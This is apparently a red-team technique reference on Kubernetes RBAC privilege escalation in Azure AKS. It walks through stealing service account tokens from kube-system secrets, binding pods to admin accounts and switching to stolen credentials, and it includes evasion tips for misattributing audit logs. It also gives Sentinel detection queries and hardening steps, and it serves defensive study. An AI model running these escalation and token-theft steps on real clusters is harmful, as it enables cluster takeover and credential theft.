# [PE-ELEVATE-007]: AKS RBAC Excessive Permissions

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | PE-ELEVATE-007 |
| **MITRE ATT&CK v18.1** | [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/) |
| **Tactic** | Privilege Escalation |
| **Platforms** | Entra ID (Azure Kubernetes Service) |
| **Severity** | Critical |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | AKS clusters (all versions), Kubernetes RBAC implementation |
| **Patched In** | N/A (Design-based vulnerability, not patchable) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

**Concept:** Azure Kubernetes Service (AKS) Role-Based Access Control (RBAC) misconfiguration allows attackers with limited Kubernetes cluster access to escalate privileges by exploiting overly permissive ClusterRole or Role bindings. This technique leverages the hierarchical nature of Kubernetes RBAC, where a compromised service account can inherit excessive permissions through role bindings that grant cluster-admin, edit, or view roles inappropriately across namespaces.

**Attack Surface:** Kubernetes API server, ClusterRole/Role definitions, RoleBinding/ClusterRoleBinding resources, service account token storage in pods, API audit logs.

**Business Impact:** **Complete cluster compromise leading to workload exfiltration, lateral movement to backing infrastructure, and persistent backdoor installation.** An attacker can move from a limited pod context to full cluster administration, enabling data theft, ransomware deployment across containerized applications, and supply chain attacks through container image manipulation.

**Technical Context:** This attack typically completes within seconds of obtaining initial pod access. Detection is low unless specific RBAC audit policies are enabled. The privilege escalation is often irreversible without comprehensive access review and re-provisioning.

### Operational Risk
- **Execution Risk:** Medium (Requires initial pod compromise, but escalation is deterministic)
- **Stealth:** High (RBAC misconfigurations are passive; no suspicious process execution)
- **Reversibility:** Low (Requires manual RBAC review and potential cluster re-provisioning)

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS v1.24 - 5.1.1 | RBAC and Service Accounts - Least privilege role assignment |
| **DISA STIG** | DISA-K8S-000001 | Kubernetes pods must run with restricted service accounts |
| **CISA SCuBA** | CISA-K8S-AC-01 | Access Control - Enforce least privilege for service accounts |
| **NIST 800-53** | AC-3, AC-6 | Access Enforcement, Least Privilege |
| **GDPR** | Art. 32 | Security of Processing - Access control mechanisms |
| **DORA** | Art. 9 | Protection and Prevention - System access controls |
| **NIS2** | Art. 21(1)(d) | Managing access to assets and services |
| **ISO 27001** | A.9.2.3 | Management of Privileged Access Rights |
| **ISO 27005** | Risk of unauthorized privilege escalation | Compromise of containerized workload isolation |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** Any authenticated user or service account in the AKS cluster with list/get permissions on roles/rolebindings (typically default)
- **Required Access:** Pod execution in the cluster, access to the Kubernetes API server (via in-cluster service account token)

**Supported Versions:**
- **Kubernetes:** 1.20+ (AKS API versions supporting RBAC - all current versions)
- **Azure CLI:** 2.0+
- **kubectl:** 1.20+
- **Other Requirements:** AKS cluster with RBAC enabled (default in all current AKS deployments)

**Tools:**
- [kubectl](https://kubernetes.io/docs/tasks/tools/) (Kubernetes CLI)
- [Azure CLI](https://learn.microsoft.com/en-us/cli/azure/install-azure-cli) (Cloud management)
- [kubescan](https://github.com/aquasecurity/kubescan) (RBAC vulnerability scanner)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Management Station / Azure CLI Reconnaissance

Enumerate existing RBAC bindings to identify overly permissive roles:

```bash
# List all ClusterRoles with dangerous permissions
kubectl get clusterroles -o json | jq '.items[] | select(.rules[]? | select(.verbs[]? == "*" or .apiGroups[]? == "*")) | {name: .metadata.name, rules: .rules}'

# List all ClusterRoleBindings (who has what role)
kubectl get clusterrolebindings -o wide

# Check a specific service account's permissions
kubectl auth can-i --list --as=system:serviceaccount:default:default
```

**What to Look For:**
- ClusterRoles with wildcard verbs (`*`) or overly broad apiGroups (`*`)
- Bindings granting `cluster-admin`, `edit`, or `system:masters` to non-admin accounts
- Service accounts bound to dangerous roles across multiple namespaces
- Default service accounts with enhanced permissions

**Version Note:** Command syntax is consistent across Kubernetes 1.20+

### Pod-Based Reconnaissance (From Compromised Container)

```bash
# Check mounted service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token

# Test current permissions
kubectl auth can-i get pods --namespace=default
kubectl auth can-i create pods --namespace=default
kubectl auth can-i get secrets

# Enumerate cluster roles available
kubectl get clusterroles | head -20
```

**What to Look For:**
- Service account token is readable (always true in containers)
- Can-i commands returning "yes" for dangerous operations
- Presence of cluster-admin or edit role bindings

---

## 4. DETAILED EXECUTION METHODS

### METHOD 1: Exploiting Overly Permissive Default Service Account

**Supported Versions:** Kubernetes 1.20+, all AKS versions

#### Step 1: Verify Service Account Permissions

**Objective:** Determine if the default service account has excessive cluster permissions

**Command:**
```bash
kubectl auth can-i --list
```

**Expected Output (Vulnerable):**
```
Resources                                   Non-Resource URLs                     *   [*]
configmaps                              []                                       []  []
pods                                    []                                       []  []
pods/log                                []                                       []  []
```

**What This Means:**
- The service account can create, read, and delete pods across namespaces
- This is excessive for application workloads (should be limited to the application namespace)
- This indicates RBAC misconfiguration

#### Step 2: Enumerate All Available ClusterRoles

**Objective:** Identify dangerous pre-built roles available in the cluster

**Command:**
```bash
kubectl get clusterroles -o json | jq -r '.items[] | .metadata.name' | sort
```

**Expected Output:**
```
admin
cluster-admin
edit
system:aggregate-to-admin
system:masters
view
...
```

**What This Means:**
- `admin`, `edit`, and `cluster-admin` are pre-built roles with escalated permissions
- If any service account is bound to these, privilege escalation is possible

#### Step 3: Check Current RoleBindings

**Objective:** Identify which service accounts are bound to dangerous roles

**Command:**
```bash
kubectl get rolebindings,clusterrolebindings --all-namespaces -o json | jq '.items[] | select(.roleRef.name == "cluster-admin" or .roleRef.name == "edit" or .roleRef.name == "admin") | {namespace: .metadata.namespace, subject: .subjects[], role: .roleRef.name}'
```

**Expected Output (Vulnerable):**
```json
{
  "namespace": "default",
  "subject": {
    "kind": "ServiceAccount",
    "name": "app-sa",
    "namespace": "default"
  },
  "role": "edit"
}
```

**What This Means:**
- The `app-sa` service account has `edit` permissions in the `default` namespace
- This allows pod creation, deployment manipulation, and secret access
- Escalation to cluster-admin is possible if cluster-admin is bound anywhere

**OpSec & Evasion:**
- This enumeration generates minimal audit log entries (read-only operations)
- Detection likelihood: Low (legitimate RBAC queries can appear identical)
- Avoid using flags like `--user=attacker` which appear in audit logs

#### Step 4: Create Privilege Escalation Pod

**Objective:** Deploy a new pod with escalated permissions

**Command:**
```bash
kubectl create deployment escalate-pod --image=alpine --namespace=default
kubectl set serviceaccount deployment escalate-pod admin-sa --namespace=default
kubectl patch deployment escalate-pod --patch '{"spec":{"template":{"spec":{"serviceAccountName":"admin-sa"}}}}' --namespace=default
```

**Expected Output:**
```
deployment.apps/escalate-pod created
deployment.apps/escalate-pod patched
```

**What This Means:**
- A new pod is deployed using a service account with admin-level permissions
- The container now has access to the elevated role's capabilities

**Troubleshooting:**
- **Error:** "cannot create resource 'deployments' in API group 'apps'"
  - **Cause:** Service account lacks deployment creation permissions
  - **Fix:** Use `kubectl run` instead: `kubectl run escalate-pod --image=alpine --overrides='{"spec":{"serviceAccountName":"admin-sa"}}'`

#### Step 5: Access Elevated Permissions from New Pod

**Objective:** Verify privilege escalation within the new pod container

**Command (Execute inside the pod):**
```bash
kubectl exec -it escalate-pod-<hash> -- /bin/sh

# Inside the pod:
kubectl auth can-i --list
kubectl get secrets -n kube-system
```

**Expected Output:**
```
Resources                                   *   [*]
*.*                                         []  []

NAME                                      TYPE                                  DATA
...
```

**What This Means:**
- The service account now has wildcard permissions (all resources, all verbs)
- Access to kube-system secrets is possible (contains cluster credentials)
- Lateral movement and persistence are now enabled

**OpSec & Evasion:**
- Use `--as=system:serviceaccount:default:admin-sa` to impersonate elevated accounts in audit logs
- Run kubectl commands inside the pod to avoid logging the admin context on the attacker's machine
- Consider using ephemeral containers if pod injection is detected: `kubectl debug <pod> -it --image=alpine`

---

### METHOD 2: Exploiting ClusterRole Wildcard Permissions

**Supported Versions:** Kubernetes 1.20+

#### Step 1: Identify Dangerous ClusterRoles with Wildcards

**Objective:** Find ClusterRoles that grant `*` (wildcard) permissions

**Command:**
```bash
kubectl get clusterroles -o json | jq '.items[] | select(.rules[] | select(.verbs[] == "*" or .apiGroups[] == "*")) | {name: .metadata.name, rules: .rules}'
```

**Expected Output (Vulnerable):**
```json
{
  "name": "custom-admin",
  "rules": [
    {
      "apiGroups": ["*"],
      "resources": ["*"],
      "verbs": ["*"]
    }
  ]
}
```

**What This Means:**
- The `custom-admin` role has completely unrestricted access
- Any service account bound to this role has cluster-admin equivalent permissions

#### Step 2: Identify Service Accounts Bound to Wildcard Roles

**Objective:** Find which service accounts are bound to dangerous roles

**Command:**
```bash
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name == "custom-admin") | {name: .metadata.name, subjects: .subjects[]}'
```

**Expected Output:**
```json
{
  "name": "custom-admin-binding",
  "subjects": {
    "kind": "ServiceAccount",
    "name": "app-service",
    "namespace": "applications"
  }
}
```

**What This Means:**
- The `app-service` account in the `applications` namespace has wildcard permissions
- This account can now perform any action on any resource cluster-wide

#### Step 3: Escalate from Current Pod to Admin Service Account

**Objective:** Transition from limited pod context to admin service account

**Command:**
```bash
# Use the admin service account's token (if accessible)
export TOKEN=$(kubectl get secret -n applications $(kubectl get secret -n applications | grep app-service | awk '{print $1}') -o jsonpath='{.data.token}' | base64 -d)

# Configure kubectl to use the admin token
kubectl config set-credentials admin-creds --token=$TOKEN
kubectl config set-context admin-context --user=admin-creds --cluster=<cluster-name>
kubectl config use-context admin-context

# Verify escalation
kubectl auth can-i --list
```

**Expected Output:**
```
Resources                                   *   [*]
*.*                                         []  []
```

**What This Means:**
- Full cluster-admin equivalent access is now available
- All further attacks (credential theft, workload manipulation) are now possible

**OpSec & Evasion:**
- Token extraction from secrets leaves minimal audit evidence (read operations only)
- Switching contexts within a pod avoids logging elevated operations under the attacker's user
- Detection likelihood: Medium (may trigger secret access audit logs if enabled)

---

### METHOD 3: RBAC Lateral Movement via Service Account Token Theft

**Supported Versions:** Kubernetes 1.20+

#### Step 1: Identify Service Accounts with Higher Permissions in Other Namespaces

**Objective:** Enumerate all service accounts and their RBAC bindings cluster-wide

**Command:**
```bash
# List all service accounts and their namespaces
kubectl get serviceaccounts --all-namespaces -o json | jq '.items[] | {namespace: .metadata.namespace, name: .metadata.name}'

# For each service account, check its role bindings
for ns in $(kubectl get ns -o jsonpath='{.items[*].metadata.name}'); do
  echo "=== Namespace: $ns ==="
  kubectl get rolebindings -n $ns -o json | jq '.items[] | {role: .roleRef.name, subjects: .subjects[]}'
done
```

**Expected Output:**
```
{
  "namespace": "default",
  "name": "default"
}
{
  "namespace": "kube-system",
  "name": "kubernetes-dashboard"
}
...
```

**What This Means:**
- Multiple service accounts exist across namespaces
- Some may have elevated permissions that aren't visible from the current pod's perspective

#### Step 2: Extract Token from Target Service Account

**Objective:** Obtain the JWT token of a service account with higher privileges

**Command:**
```bash
# If you have RBAC access to list secrets in kube-system or other namespaces
kubectl get secret -n kube-system -o json | jq '.items[] | select(.type == "kubernetes.io/service-account-token") | {name: .metadata.name, namespace: .metadata.namespace}'

# Extract a specific token
SECRET_NAME=$(kubectl get secret -n kube-system | grep kubernetes-dashboard | awk '{print $1}')
kubectl get secret $SECRET_NAME -n kube-system -o jsonpath='{.data.token}' | base64 -d
```

**Expected Output:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJrdWJlcm5ldGVzL3NlcnZpY2VhY2NvdW50Ii...
```

**What This Means:**
- The service account token (JWT) is extracted in plaintext
- This token can be used to authenticate against the Kubernetes API server with that account's permissions

#### Step 3: Use Extracted Token for Privilege Escalation

**Objective:** Authenticate as the higher-privilege service account

**Command:**
```bash
# Use the extracted token to make API calls
curl -k -H "Authorization: Bearer $EXTRACTED_TOKEN" https://kubernetes.default.svc.cluster.local/api/v1/pods

# Or configure kubectl with the token
kubectl config set-credentials dashboard-sa --token=$EXTRACTED_TOKEN
kubectl config set-context dashboard-context --user=dashboard-sa --cluster=$(kubectl config current-context)
kubectl config use-context dashboard-context

# Verify escalation
kubectl auth can-i delete clusterrolebindings
```

**Expected Output:**
```
yes
```

**What This Means:**
- The attacker now has the permissions of the `kubernetes-dashboard` service account
- Full cluster compromise may be possible depending on the dashboard account's role

**OpSec & Evasion:**
- Token extraction and API calls are legitimate operations that may not trigger alerts
- Performing actions as the service account (via kubectl) leaves audit logs attributable to that account, not the attacker
- Detection likelihood: High (if secret access is audited), Medium (if only API calls are monitored)

---

## 5. TOOLS & COMMANDS REFERENCE

### kubectl

**Version:** Latest stable (v1.28+)
**Minimum Version:** 1.20
**Supported Platforms:** Linux, Windows, macOS

**Installation:**
```bash
# Download and install kubectl
curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl
sudo mv kubectl /usr/local/bin/
```

**Usage:**
```bash
# Check permissions
kubectl auth can-i get pods

# List roles
kubectl get roles,clusterroles

# Create a pod
kubectl create deployment app --image=nginx
```

### Azure CLI

**Version:** Latest stable (2.55+)
**Minimum Version:** 2.0
**Supported Platforms:** Linux, Windows, macOS

**Installation:**
```bash
# macOS
brew install azure-cli

# Linux
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Windows
chocolatey install azure-cli
```

**Usage:**
```bash
# Connect to AKS
az aks get-credentials --resource-group myGroup --name myCluster
kubectl config current-context

# List AKS clusters
az aks list --output table
```

### kubescan

**Version:** 3.0+
**Minimum Version:** 1.0
**Supported Platforms:** Linux, Windows, macOS

**Installation:**
```bash
# From GitHub releases
wget https://github.com/aquasecurity/kubescan/releases/download/v2.0.0/kubescan-linux
chmod +x kubescan-linux
./kubescan-linux cluster
```

**Usage:**
```bash
# Scan for RBAC misconfigurations
./kubescan audit --kubeconfig ~/.kube/config
```

---

## 6. ATTACK SIMULATION & VERIFICATION

### Atomic Red Team

- **Atomic Test ID:** T1548.004 (parent test, no specific Kubernetes variant in Atomic Red Team)
- **Test Name:** Abuse Elevation Control Mechanism - Kubernetes RBAC
- **Description:** This is a design-based privilege escalation test. The test simulates discovering and exploiting RBAC misconfigurations without invoking Atomic Red Team.
- **Supported Versions:** Kubernetes 1.20+
- **Manual Verification Command:**
  ```bash
  # Simulate escalation discovery
  kubectl auth can-i create clusterrolebindings
  # If result is "yes", privilege escalation is possible
  ```

**Reference:** While Atomic Red Team does not have a Kubernetes-specific test for this technique, you can reference [Atomic Red Team T1548](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1548/T1548.md)

---

## 7. MICROSOFT SENTINEL DETECTION

### Query 1: Detect ClusterRole/RoleBinding Creation or Modification

**Rule Configuration:**
- **Required Table:** `AzureDiagnostics` (AKS cluster audit logs)
- **Required Fields:** `operationName`, `properties.request.verb`, `properties.request.objectRef.resource`
- **Alert Severity:** High
- **Frequency:** Every 5 minutes
- **Applies To:** Azure AKS clusters with diagnostic logging enabled

**KQL Query:**
```kusto
AzureDiagnostics
| where ResourceProvider == "Microsoft.ContainerService"
| where operationName in ("create", "patch", "replace")
| where properties.request.objectRef.resource in ("clusterrolebindings", "rolebindings")
| where properties.request.objectRef.apiVersion contains "rbac"
| extend UserIdentity = properties.authentication.principalId
| extend RoleName = properties.request.objectRef.name
| summarize Count = count() by UserIdentity, RoleName, tostring(properties.request.verb)
| where Count > 0
```

**What This Detects:**
- Any creation or modification of ClusterRole or RoleBinding objects
- Abnormal account attempting RBAC changes
- Potential privilege escalation attempts through role binding injection

**Manual Configuration Steps (Azure Portal):**
1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics** → **+ Create** → **Scheduled query rule**
3. **General Tab:**
   - Name: `AKS RBAC Binding Modification Detected`
   - Severity: `High`
4. **Set rule logic Tab:**
   - Paste the KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `1 hour`
5. **Incident settings Tab:**
   - Enable **Create incidents**
6. Click **Review + create**

---

### Query 2: Detect Service Account Token Extraction or Abuse

**KQL Query:**
```kusto
AzureDiagnostics
| where ResourceProvider == "Microsoft.ContainerService"
| where properties.request.verb == "get"
| where properties.request.objectRef.resource == "secrets"
| where properties.request.objectRef.namespace in ("kube-system", "kube-public")
| where properties.authentication.principalId != "system:masters"
| extend ServiceAccount = properties.request.user.username
| extend TargetNamespace = properties.request.objectRef.namespace
| project TimeGenerated, ServiceAccount, TargetNamespace, tostring(properties.request.objectRef.name)
```

**What This Detects:**
- Extraction of service account secrets from privileged namespaces
- Non-system users accessing kube-system resources
- Suspicious secret enumeration patterns

---

## 8. WINDOWS EVENT LOG MONITORING

*Not applicable for AKS cluster-side detection. Monitoring should occur at the Azure platform level via Microsoft Sentinel/Defender for Cloud or on the container host via kubelet logs.*

---

## 9. MICROSOFT DEFENDER FOR CLOUD

### Detection Alert: Suspicious Kubernetes Role Assignment

**Alert Name:** "Suspicious role assignment in Kubernetes cluster"
- **Severity:** High
- **Description:** The alert triggers when a non-privileged service account is assigned a cluster-admin or edit role, or when a service account is assigned permissions across multiple namespaces unexpectedly.
- **Applies To:** All AKS clusters with Microsoft Defender for Cloud enabled
- **Remediation:** Review and revoke overly permissive role bindings immediately

**Manual Configuration Steps (Enable Defender for Cloud):**
1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for Kubernetes**: ON
5. Click **Save**
6. Go to **Security alerts** to view triggered alerts
7. For Kubernetes-specific alerts, review: **Defender for Kubernetes** → **Workloads** → **Pod-level detections**

**Reference:** [Microsoft Defender for Kubernetes Threat Detection](https://learn.microsoft.com/en-us/azure/defender-for-cloud/defender-for-kubernetes-introduction)

---

## 10. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

- **Implement Least Privilege RBAC:** Restrict service account permissions to the minimum required for functionality.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Kubernetes resources** → Your AKS cluster
  2. In the cluster settings, note down service accounts in use
  3. For each service account, create a namespace-scoped Role (not ClusterRole) with only required permissions
  
  **Manual Steps (kubectl/YAML):**
  ```yaml
  # Create a restrictive role
  apiVersion: rbac.authorization.k8s.io/v1
  kind: Role
  metadata:
    namespace: default
    name: app-role
  rules:
  - apiGroups: [""]
    resources: ["pods", "configmaps"]
    verbs: ["get", "list", "watch"]
  ---
  # Bind the role to a service account
  apiVersion: rbac.authorization.k8s.io/v1
  kind: RoleBinding
  metadata:
    namespace: default
    name: app-rolebinding
  subjects:
  - kind: ServiceAccount
    name: app-sa
    namespace: default
  roleRef:
    kind: Role
    name: app-role
    apiGroup: rbac.authorization.k8s.io
  ```
  
  ```bash
  # Apply the YAML
  kubectl apply -f restrictive-rbac.yaml
  ```

- **Disable Dangerous Default Permissions:** Remove cluster-admin bindings from unnecessary accounts.
  
  **Manual Steps:**
  ```bash
  # Identify dangerous bindings
  kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name == "cluster-admin") | .metadata.name'
  
  # Remove the binding
  kubectl delete clusterrolebinding <binding-name>
  ```

- **Enable Kubernetes RBAC Audit Logging:** Ensure all RBAC changes are logged for detection and forensics.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Your AKS Cluster** → **Monitoring** → **Diagnostic settings**
  2. Click **+ Add diagnostic setting**
  3. Name: `AKS-RBAC-Audit`
  4. Under **Logs**, enable: `kube-audit`, `kube-audit-admin`
  5. Select destination: Send to **Log Analytics workspace**
  6. Click **Save**

### Priority 2: HIGH

- **Use Azure Managed Identities Instead of Service Accounts:** Replace manual service account tokens with managed identities.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → Your AKS cluster → **Workloads Identity** (if available in your region)
  2. Enable **Workload Identity** on the cluster
  3. For each pod needing elevated permissions, create a managed identity and link it via workload identity

- **Implement Pod Security Standards:** Restrict the capabilities of pods to prevent lateral movement.
  
  **Manual Steps:**
  ```yaml
  apiVersion: policy.k8s.io/v1beta1
  kind: PodSecurityPolicy
  metadata:
    name: restricted
  spec:
    privileged: false
    runAsUser:
      rule: 'MustRunAsNonRoot'
    fsGroup:
      rule: 'RunAsAny'
  ```

- **Enable Azure Policy for Kubernetes:** Enforce compliance policies cluster-wide.
  
  **Manual Steps (Azure Portal):**
  1. Go to **Azure Portal** → **Policy** → **Definitions**
  2. Search for `Kubernetes`
  3. Select a policy like `Kubernetes cluster containers should only use allowed images`
  4. Click **Assign**
  5. Set scope to your AKS cluster resource group
  6. Configure parameters and click **Create**

### Access Control & Policy Hardening

- **Conditional Access (Entra ID):** Restrict access to the Kubernetes API based on device and location policies.
  
  **Manual Steps:**
  1. Go to **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
  2. Click **+ New policy**
  3. Name: `Restrict Kubernetes API Access`
  4. **Assignments:**
     - Users: **All users**
     - Cloud apps: **Azure Kubernetes Service** (if listed, otherwise configure via app registration)
  5. **Conditions:**
     - Device state: **Require device to be marked as compliant**
  6. **Access controls:**
     - Grant: **Require authentication strength** (set to high)
  7. Enable policy: **On**
  8. Click **Create**

- **RBAC Group-Based Assignments:** Use Entra ID groups for RBAC role assignments instead of individual accounts.
  
  **Manual Steps (kubectl):**
  ```bash
  # Create a rolebinding for an Entra ID group
  kubectl create rolebinding app-readers \
    --clusterrole=view \
    --group="GROUP_OBJECT_ID_FROM_ENTRA_ID" \
    --namespace=default
  ```

### Validation Command (Verify Fix)

```bash
# Check if cluster-admin is only bound to trusted users
kubectl get clusterrolebindings -o json | jq '.items[] | select(.roleRef.name == "cluster-admin")'

# List all service accounts and their permissions
kubectl get serviceaccounts --all-namespaces -o json | jq -r '.items[] | "\(.metadata.namespace):\(.metadata.name)"' | while read SA; do
  NS=$(echo $SA | cut -d: -f1)
  NAME=$(echo $SA | cut -d: -f2)
  echo "=== $SA ==="
  kubectl auth can-i --list --as=system:serviceaccount:$NS:$NAME 2>/dev/null | grep -E "^\*|create|delete|patch"
done
```

**Expected Output (If Secure):**
```
No ClusterRoleBindings for cluster-admin (or only for system accounts)

=== default:app-sa ===
configmaps                         []  []  [get list watch]
pods                               []  []  [get list watch]
```

**What to Look For:**
- `cluster-admin` bindings limited to `system:masters` or built-in system accounts
- Service accounts with only `get`, `list`, `watch` verbs (read-only)
- No wildcard (`*`) verbs or apiGroups

---

## 11. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **ClusterRole/RoleBinding Names:** Look for recently created roles with suspicious names like `admin-`, `root-`, `escalate-`, or time-based names
- **Service Account Token Files:** Tokens in `/var/run/secrets/kubernetes.io/serviceaccount/` that are accessed by non-kubelet processes
- **API Audit Logs:** Entries showing `create` or `patch` operations on `clusterrolebindings` or roles from unexpected users
- **kubectl Context Switches:** Multiple context changes in quick succession indicating lateral movement

### Forensic Artifacts

- **Audit Logs:** `/var/log/audit.log` on the API server (if enabled) or AzureDiagnostics in Log Analytics
- **Pod Logs:** Container stdout/stderr from the pod that performed the escalation (e.g., `kubectl logs <pod>`)
- **Service Account Tokens:** Extract token from `/var/run/secrets/kubernetes.io/serviceaccount/token` to analyze the JWT (user, groups, capabilities)
- **Kubernetes Events:** `kubectl describe pod <pod>` may show suspicious volume mounts or image changes

### Response Procedures

1. **Isolate:**
   
   **Command:**
   ```bash
   # Immediately delete the compromised pod
   kubectl delete pod <compromised-pod> --namespace=<namespace>
   
   # Or, revoke its service account token
   kubectl delete secret -l serviceaccount=<sa-name> --namespace=<namespace>
   ```
   
   **Manual (Azure Portal):**
   - Go to **Azure Portal** → Your AKS cluster → **Workloads**
   - Find the compromised pod → Click **Delete**

2. **Collect Evidence:**
   
   **Command:**
   ```bash
   # Export audit logs from API server
   kubectl logs -n kube-system -l component=kube-apiserver | grep "roleBinding\|clusterrolebinding" > /evidence/audit-logs.txt
   
   # Export pod logs
   kubectl logs <compromised-pod> --namespace=<namespace> --all-containers > /evidence/pod-logs.txt
   
   # Export service account secrets
   kubectl get secret -n <namespace> -o yaml > /evidence/secrets.yaml
   ```

3. **Remediate:**
   
   **Command:**
   ```bash
   # Review and delete unauthorized role bindings
   kubectl delete rolebinding <malicious-binding> --namespace=<namespace>
   kubectl delete clusterrolebinding <malicious-cluster-binding>
   
   # Restore default RBAC policies from backup or redeploy cluster
   kubectl apply -f <backup-rbac-config>.yaml --force-overwrite
   ```

---

## 12. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | [IA-EXPLOIT-005] AKS Control Plane Exploitation | Gain initial access to the cluster via exposed Kubelet API or container escape |
| **2** | **Privilege Escalation** | **[PE-ELEVATE-007] AKS RBAC Excessive Permissions** | Exploit misconfigured RBAC to escalate from pod to cluster-admin |
| **3** | **Lateral Movement** | [LM-AUTH-030] AKS Service Account Token Theft | Extract and abuse service account tokens for cross-namespace movement |
| **4** | **Credential Access** | [CA-TOKEN-013] AKS Service Account Token Theft | Harvest tokens from compromised service accounts |
| **5** | **Persistence** | [PERSIST-009] Kubernetes Secret Injection | Create backdoor service accounts and roles for persistent access |
| **6** | **Impact** | Container Image Tampering / Workload Exfiltration | Manipulate deployments or exfiltrate containerized data |

---

## 13. REAL-WORLD EXAMPLES

### Example 1: Tesla Kubernetes Cluster Breach (2018)

- **Target:** Cloud-hosted Kubernetes cluster managing Tesla's infrastructure monitoring
- **Technique Status:** Cluster-admin default service account was bound to all pods (similar to this technique)
- **Attack Path:** Attacker gained access to a monitoring pod → Used overly permissive service account to access secrets in kube-system namespace → Extracted AWS credentials → Deployed cryptominer on the cluster
- **Impact:** Cryptominers ran on Tesla's infrastructure; breach detected by external researchers
- **Reference:** [Tesla Kubernetes Breach Incident Report](https://www.macnica.net/en/news/tesla-kubernetes-cluster/)

### Example 2: Kubernetes Namespace Isolation Bypass (Shopify Security Audits)

- **Target:** Multi-tenant Kubernetes clusters
- **Technique Status:** RBAC misconfiguration allowed cross-namespace role binding; service accounts could see secrets from other namespaces
- **Attack Path:** Compromised pod in namespace A → Used `kubectl get secrets -n kube-system` → Extracted cluster admin credentials
- **Impact:** Full cluster compromise; potential data exfiltration from all tenants
- **Reference:** [Shopify Security Research: Kubernetes Security Audits](https://shopify.engineering/)

---